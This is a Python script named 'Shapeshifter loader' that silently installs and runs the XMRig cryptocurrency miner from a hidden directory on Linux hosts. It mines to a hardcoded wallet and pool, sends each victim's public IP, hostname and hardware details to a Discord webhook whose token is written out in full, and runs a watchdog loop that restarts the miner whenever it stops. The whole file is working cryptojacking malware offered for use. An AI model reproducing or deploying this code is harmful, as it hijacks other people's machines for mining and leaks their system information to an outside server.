import os
import platform
import subprocess
import time
import socket
import requests
import json
import tarfile
import logging
from urllib.request import urlretrieve

WEBHOOK = "https://discord.com/api/webhooks/1395138384518844508/riuLCmuUuVfVZECJE-zW75VwARH2p9jd8yP_Z1ndjP4gvNMH08Mf7C9PpXcITM-nmw8B"  # 🔁 Replace with your real Discord webhook
WALLET = "ZEPHYR2zxTXUfUEtvhU5QSDjPPBq6XtoU8faeFj3mTEr5hWs5zERHsXT9xc6ivLNMmbbQvxWvGUaxAyyLv3Cnbb9MgemKUED19M2b.worker001"  # 🔁 Replace with your real Monero wallet
POOL = "fr.zephyr.herominers.com:1123"  # You can customize this if needed

XM_DIR = os.path.expanduser("~/.local/share/.kdev")
XM_BIN = os.path.join(XM_DIR, "xmrig")
TAR_URL = "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"

os.makedirs(XM_DIR, exist_ok=True)

# Set up logging
logging.basicConfig(filename=os.path.join(XM_DIR, "miner_log.txt"), level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

def download_xmrig():
    """Download and extract the xmrig binary"""
    tar_path = os.path.join(XM_DIR, "xmrig.tar.gz")
    try:
        urlretrieve(TAR_URL, tar_path)
        logging.info("Download successful.")
        with tarfile.open(tar_path, "r:gz") as tar:
            for member in tar.getmembers():
                if member.name.endswith("xmrig"):
                    member.name = "xmrig"
                    tar.extract(member, path=XM_DIR)
        os.chmod(XM_BIN, 0o755)
        os.remove(tar_path)
        logging.info(f"Extraction complete, permissions set on {XM_BIN}")
        return True
    except Exception as e:
        logging.error(f"XMRig download failed: {e}")
        notify(f"❌ XMRig download failed: {e}")
        return False

def notify(message):
    """Send a notification via Discord webhook"""
    try:
        requests.post(WEBHOOK, json={"content": message})
    except Exception as e:
        logging.error(f"Failed to send notification: {e}")

def system_info():
    """Gather system information for logging purposes"""
    try:
        info = {
            "IP": requests.get("https://api.ipify.org").text.strip(),
            "Hostname": socket.gethostname(),
            "OS": platform.system() + " " + platform.release(),
            "Arch": platform.machine(),
            "CPU": subprocess.getoutput("lscpu | grep 'Model name' | cut -d ':' -f2").strip(),
            "RAM": subprocess.getoutput("free -h | awk '/Mem/ {print $2}'").strip(),
            "Threads": str(os.cpu_count())
        }
        return info
    except Exception as e:
        logging.error(f"Failed to get system info: {e}")
        return {"error": str(e)}

def start_miner():
    """Start the miner and return status"""
    try:
        if not os.path.exists(XM_BIN) or not os.access(XM_BIN, os.X_OK):
            logging.error(f"Miner binary not found or not executable: {XM_BIN}")
            return False

        cmd = [XM_BIN, "-o", POOL, "-u", WALLET, "--donate-level", "1", "-k", "-t", str(os.cpu_count())]
        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        logging.info("Miner started successfully.")
        return True
    except Exception as e:
        logging.error(f"Failed to start miner: {e}")
        notify(f"❌ Failed to start miner: {e}")
        return False

def is_miner_running():
    """Check if the miner is running"""
    try:
        output = subprocess.getoutput("ps aux | grep xmrig | grep -v grep")
        return "xmrig" in output
    except Exception as e:
        logging.error(f"Failed to check miner status: {e}")
        return False

def watchdog():
    """Ensure the miner stays running and restart it if necessary"""
    while True:
        time.sleep(60)
        if not is_miner_running():
            logging.warning("Miner stopped. Attempting to restart...")
            notify("🔁 Miner not running, restarting...")
            start_miner()

def main():
    logging.info("Shapeshifter loader started.")
    if not os.path.exists(XM_BIN):
        logging.info("Downloading xmrig...")
        if not download_xmrig():
            return

    sysinfo = system_info()
    info_str = "\n".join([f"{k}: {v}" for k, v in sysinfo.items()])
    notify(f"✅ Shapeshifter Loader\n🧠 Miner initialized\n```{info_str}```")

    if not start_miner():
        logging.error("Failed to start miner on initial launch.")
        return

    # Start the watchdog loop
    watchdog()

if __name__ == "__main__":
    main()
